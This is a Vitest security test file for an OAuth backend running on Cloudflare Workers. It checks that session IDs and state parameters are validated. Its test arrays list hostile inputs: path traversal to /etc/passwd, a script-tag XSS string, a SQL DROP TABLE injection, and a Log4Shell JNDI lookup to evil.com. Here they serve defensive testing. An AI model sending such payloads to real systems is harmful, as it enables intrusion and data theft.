// @agent: cloudflare-backend
import { describe, it, expect, beforeEach, vi } from "vitest";
import worker from "../../index";
import type { Env } from "../types";

describe("Input Validation Security Tests", () => {
  let env: Env;

  beforeEach(() => {
    env = {
      OAUTH_SESSIONS: {
        get: vi.fn().mockResolvedValue(null),
        put: vi.fn().mockResolvedValue(undefined),
        delete: vi.fn().mockResolvedValue(undefined)
      },
  RATE_LIMITER: {
        get: vi.fn().mockResolvedValue(null),
        put: vi.fn().mockResolvedValue(undefined),
        delete: vi.fn().mockResolvedValue(undefined)
      },
  GOOGLE_CLIENT_ID: "test-client-id",
      CLIENT_ID: "test-client-id",
      REDIRECT_URI: "http://localhost/callback",
      FRONTEND_URL: "http://localhost",
      SESSION_ENCRYPTION_KEY: "test-encryption-key-for-input-validation-test!",
      SESSION_ENCRYPTION_SALT: "test-salt-for-input-validation-test"
    } as unknown as Env;
  });

  describe("Session ID Validation", () => {
    it("should reject session IDs with injection attempts", async () => {
      const maliciousIds = [
        "../../../etc/passwd",
        "session:../../admin",
        "<script>alert(1)</script>",
        '"; DROP TABLE sessions; --',
        "session%3A%2E%2E%2F%2E%2E%2Fadmin",
        "session:${jndi:ldap://evil.com/a}",
        "a".repeat(200), // Too long
        "", // Empty
      ];

      for (const maliciousId of maliciousIds) {
        // Special handling for empty string
        const headers: Record<string, string> = {};
        if (maliciousId === "") {
          headers["Authorization"] = "Bearer ";
        } else {
          headers["Authorization"] = `Bearer ${maliciousId}`;
        }

        const request = new Request("http://localhost/oauth/session", {
          headers
        });

        const response = await worker.fetch(request, env, {});
        expect(response.status).toBe(400);

        const data = (await response.json()) as any;
        // All validation errors now return 'invalid_request' for security
        expect(data.error).toBe("invalid_request");
        expect(data.error_description).toBe("Authentication failed");

        // Ensure KV was never called with malicious input
        expect(env.OAUTH_SESSIONS.get).not.toHaveBeenCalled();
        vi.clearAllMocks();
      }
    });

    it("should accept valid session IDs", async () => {
      // Use SessionManager to properly encrypt the session data
      const { SessionManager } = await import("../session-manager");
      const { RequestContext } = await import("../../utils/request-context");
      const sessionManager = new SessionManager(env);

      // Store encrypted session data in mock KV
      const kvStore = new Map<string, string>();
      env.OAUTH_SESSIONS.put = vi.fn(async (key: string, value: string) => {
        kvStore.set(key, value);
      });
      env.OAUTH_SESSIONS.get = vi.fn(async (key: string) => {
        return kvStore.get(key) || null;
      });

      // Create a valid session with encryption
      const mockRequest = new Request("http://localhost/test");
      const context = await RequestContext.create(mockRequest, env);
      context.userId = "user-123";

      const sessionData = {
        provider: "google",
        userId: "user-123",
        email: "test@example.com",
        name: "Test User",
        expiresAt: Date.now() + 3600000
      };

      const sessionId = await sessionManager.createSession(
        sessionData,
        context
      );

      const request = new Request("http://localhost/oauth/session", {
        headers: {
          Authorization: `Bearer ${sessionId}`
        }
      });

      const response = await worker.fetch(request, env, {});
      expect(response.status).toBe(200);

      // Ensure KV was called with the safe input
      expect(env.OAUTH_SESSIONS.get).toHaveBeenCalledWith(
        `session:${sessionId}`
      );

      const responseData = (await response.json()) as any;
      expect(responseData.userId).toBe("user-123");
      expect(responseData.email).toBe("test@example.com");
    });
  });

  describe("State Parameter Validation", () => {
    it("should reject state parameters with injection attempts", async () => {
      const maliciousStates = [
        "../../../etc/passwd",
        "pkce:../../admin",
        "<script>alert(1)</script>",
        '"; DROP TABLE sessions; --',
        "pkce%3A%2E%2E%2F%2E%2E%2Fadmin",
        "pkce:${jndi:ldap://evil.com/a}",
        "a".repeat(200), // Too long
        "", // Empty
        "state with spaces",
        "state/with/slashes",
        "state\\with\\backslashes"
      ];

      for (const maliciousState of maliciousStates) {
        const request = new Request(
          `http://localhost/oauth/authorize?code_challenge=test-challenge&state=${encodeURIComponent(
            maliciousState
          )}`
        );

        const response = await worker.fetch(request, env, {});

        if (maliciousState === "") {
          expect(response.status).toBe(400);
          const data = (await response.json()) as any;
          expect(data.error).toBe("invalid_request");
        } else {
          expect(response.status).toBe(400);
          const data = (await response.json()) as any;
          expect(data.error).toBe("invalid_request");
        }

        // Ensure KV was never called with malicious input (except for rate limiting)
        // Rate limiter calls will have keys starting with "rate-limit:"
        const kvCalls = (env.OAUTH_SESSIONS.put as any).mock.calls;
        const nonRateLimitCalls = kvCalls.filter((call: any[]) => !call[0].startsWith("rate-limit:"));
        expect(nonRateLimitCalls).toHaveLength(0);
        vi.clearAllMocks();
      }
    });

    it("should accept valid state parameters", async () => {
      // Generate valid base64URL states (min 32 chars, max 128)
      const validStates = [];
      for (let i = 0; i < 5; i++) {
        const size = i === 4 ? 96 : 32; // Test max length on last one
        const randomBytes = new Uint8Array(size);
        crypto.getRandomValues(randomBytes);
        const state = btoa(String.fromCharCode(...randomBytes))
          .replace(/\+/g, '-')
          .replace(/\//g, '_')
          .replace(/=/g, '');
        validStates.push(state);
      }

      for (const validState of validStates) {
        // Generate valid PKCE challenge
        const verifier = crypto.randomUUID().replace(/-/g, '') + crypto.randomUUID().replace(/-/g, '');
        const challenge = btoa(verifier).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
        
        const request = new Request(
          `http://localhost/oauth/authorize?code_challenge=${challenge}&state=${validState}&provider=google`
        );

        const response = await worker.fetch(request, env, {});
        expect(response.status).toBe(200);

        const data = (await response.json()) as any;
        expect(data.success).toBe(true);
        expect(data.authorizationUrl).toContain(validState);

        // Ensure KV was called with the safe input
        expect(env.OAUTH_SESSIONS.put).toHaveBeenCalledWith(
          `pkce:${validState}`,
          expect.any(String),
          expect.any(Object)
        );
        vi.clearAllMocks();
      }
    });

    it("should validate state in callback endpoint", async () => {
      const maliciousStates = [
        "../../../etc/passwd",
        "<script>alert(1)</script>",
        "state with spaces"
      ];

      for (const maliciousState of maliciousStates) {
        // Reset mocks before each test
        vi.clearAllMocks();
        env.OAUTH_SESSIONS.get = vi.fn().mockResolvedValue(null);

        const request = new Request(
          `http://localhost/oauth/callback?code=test-code&state=${encodeURIComponent(
            maliciousState
          )}&code_verifier=test-verifier`,
          {
            headers: {
              "CF-Connecting-IP": "192.168.1.100"
            }
          }
        );

        const response = await worker.fetch(request, env, {});
        // GET requests to callback now return 404 (route doesn't exist)
        expect(response.status).toBe(404);

        const data = (await response.json()) as any;
        expect(data.error).toBe("not_found");

        // Ensure KV was never called with malicious input (it should be blocked by validation)
        expect(env.OAUTH_SESSIONS.get).not.toHaveBeenCalledWith(
          expect.stringContaining(maliciousState)
        );
      }
    });
  });

  describe("Performance", () => {
    it("should validate inputs quickly (< 50ms)", async () => {
      const start = Date.now();

      // Test multiple validation scenarios
      const requests = [
        new Request("http://localhost/oauth/session", {
          headers: { Authorization: "Bearer invalid" }
        }),
        new Request(
          "http://localhost/oauth/authorize?code_challenge=test&state=<script>",
        ),
        new Request(
          "http://localhost/oauth/callback?code=test&state=../../../&code_verifier=test",
        )
      ];

      for (const request of requests) {
        await worker.fetch(request, env, {});
      }

      const elapsed = Date.now() - start;
      expect(elapsed).toBeLessThan(50);
    });
  });
});
